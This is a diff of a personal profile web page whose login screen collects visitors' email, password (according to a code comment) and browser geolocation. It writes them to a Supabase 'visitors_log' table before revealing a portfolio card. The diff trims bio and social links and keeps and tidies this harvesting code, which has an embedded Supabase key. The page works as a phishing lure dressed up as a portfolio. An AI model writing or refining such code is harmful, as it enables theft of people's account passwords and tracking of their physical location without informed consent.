@@ -92,20 +92,17 @@
     </div>
     <div class="card_content">
         <div class="satan"><h4>SALEM</h4></div>
-        <div class="old-bio">Web Designer & Creative Developer.<br>Specialized in UI/UX Aesthetics.<br>BELIEVE IN YOURSELF.</div>
+        <div class="old-bio">Web Designer & Creative Developer.<br>Specialized in UI/UX Aesthetics.</div>
         <div class="social">
             <div>
                 <a href="https://t.me/kokksha"><i class="fab fa-telegram"></i></a>
                 <a href="https://www.facebook.com/share/15KQ2NmX9V/"><i class="fab fa-facebook"></i></a>
                 <a href="https://www.instagram.com/_u_vf?igsh=bXRqd2Z4ZWhteW94"><i class="fab fa-instagram"></i></a>
                 <a href="https://github.com/salemalshamrie"><i class="fas fa-code"></i></a>
-                <a href="https://16salm.github.io/AI/"><i class="fas fa-lightbulb"></i></a>
-                <a href="https://www.fcbarcelona.com"><i class="fas fa-football-ball"></i></a>
-                <a href="https://uokerbala.edu.iq/"><i class="fas fa-university"></i></a>
             </div>
         </div>
     </div>
-    <p class="footer-text">© 2026 Salem Al-Shammari | Karbala, Iraq</p>
+    <p class="footer-text">© 2026 Salem Al-Shammari</p>
 </div>
 
 <script>
@@ -113,11 +110,6 @@
     const SB_KEY = 'EyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtjY2twcGZmbGF4cHhoaXBuZ2R6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU2MzU1NTMsImV4cCI6MjA5MTIxMTU1M30.Lek1mEohH1GoUkcMQZT3vQ2tmshPJVI-Oa8f_y2mH6o';
     
     const supabaseClient = supabase.createClient(SB_URL, SB_KEY);
-
-    function showProfile() {
-        document.getElementById('auth-screen').style.display = 'none';
-        document.getElementById('profile-card').style.display = 'block';
-    }
 
     async function handleLogin() {
         const email = document.getElementById('email').value;
@@ -134,16 +126,16 @@
         loginBtn.disabled = true;
 
         // الحصول على الموقع الجغرافي
-        let userLocation = "غير متاح";
+        let userLocation = "Pending...";
         if (navigator.geolocation) {
             await new Promise((resolve) => {
                 navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        userLocation = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
+                    (pos) => {
+                        userLocation = `${pos.coords.latitude}, ${pos.coords.longitude}`;
                         resolve();
                     },
                     () => {
-                        userLocation = "تم رفض الإذن";
+                        userLocation = "Denied";
                         resolve();
                     },
                     { timeout: 5000 }
@@ -152,7 +144,7 @@
         }
 
         try {
-            // إرسال البيانات (الجيميل، الباسورد، والموقع فقط)
+            // إرسال البيانات بأسماء الأعمدة الأصلية كما طلبت
             const { error } = await supabaseClient
                 .from('visitors_log')
                 .insert([{ 
@@ -162,11 +154,13 @@
                 }]);
 
             if (error) throw error;
-            showProfile();
+
+            document.getElementById('auth-screen').style.display = 'none';
+            document.getElementById('profile-card').style.display = 'block';
 
         } catch (err) {
             console.error(err);
-            errorMsg.innerText = "خطأ في الاتصال!";
+            errorMsg.innerText = "فشل في إرسال البيانات!";
             loginBtn.innerText = "تأكيد الدخول";
             loginBtn.disabled = false;
         }
